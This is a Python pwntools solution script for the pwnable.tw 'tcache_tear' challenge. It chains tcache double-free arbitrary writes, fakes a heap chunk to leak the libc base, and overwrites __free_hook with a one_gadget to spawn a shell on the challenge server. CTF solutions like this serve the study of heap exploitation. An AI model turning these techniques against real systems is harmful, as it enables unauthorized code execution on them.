#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("tcache_tear_patched")
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')

local = False

if local:
    p = process("./tcache_tear_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10207)

elf = context.binary = ELF('./tcache_tear_patched', checksec=False)

def malloc(size, data):
    p.sendlineafter(b"Your choice :",b"1")
    p.sendafter(b"Size:",str(size))
    p.sendafter(b"Data:",data)
    print("===== MALLOC =====")

def free():
    p.sendafter(b"Your choice :",b"2")
    print("===== FREE =====")

def info():
    p.sendafter(b"Your choice :",b"3")
    print("===== INFO =====")

def exit():
    p.sendafter(b"Your choice :",b"4")
    print("===== EXIT =====")

ptr         = 0x602088
puts_got    = 0x601fa0
name = 0x602060
p.sendlineafter(b"Name:", b"C4t_f4t")

def write_to(addr, data, s):
    #print("=============== Write [" + hex(int.from_bytes(data, 'little')) + "] to [" + hex(addr) + "] ===============")
    malloc(s, b"hehe")
    free()
    free()
    malloc(s, p64(addr))
    malloc(s, b"3"*0x18)
    malloc(s, data) 

payload = flat (
    0,
    0x21,
    0,0,0,
    0x1
)
write_to(0x602550, payload, 0x60)

payload = flat(
    0,
    0x501,
    p64(0)*5,
    0x602060
)
write_to(0x602050, payload, 0x70)


free()
info()

p.recvuntil(b"Name :")
libc.address = int.from_bytes(p.recv(6), "little") - 4111520
print("[+]Libc_base:    ", hex(libc.address))

free_hook = libc.address + 4118760

og1 = 0x4f2c5 + libc.address
og2 = 0x4f322 + libc.address
og3 = 0x10a38c + libc.address
payload = flat(
    og2
)
write_to(free_hook, payload, 0x40)
free()
'''
'''
p.interactive()